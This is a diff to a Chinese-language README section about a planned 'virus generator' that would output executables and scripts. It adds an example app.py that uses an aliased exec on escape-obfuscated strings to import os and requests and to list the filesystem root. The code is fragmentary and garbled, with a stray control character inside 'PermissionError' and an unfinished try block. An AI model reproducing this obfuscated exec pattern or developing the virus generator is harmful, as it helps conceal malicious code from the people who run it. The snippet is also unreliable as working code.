@@ -28,7 +28,14 @@
 
 ## 关于未来的病毒生成器
 计划使用python制作出.exe程序和.js/.py/.vbs/.cmd/.com等可以执行的代码
+例如app.py
 ```
-<body onload>
-</body>
+a = exec
+a("b\75__imp\u006frt__\50'\\x6fs')")
+a("c=__imp\u006frt__\50'r\\u0065qu\x65sts')")
+a("""\
+try\72
+\40   _\75b\56listdir\50"/")
+\u0065xc\x65pt P\rmissionError
+""")
 ```
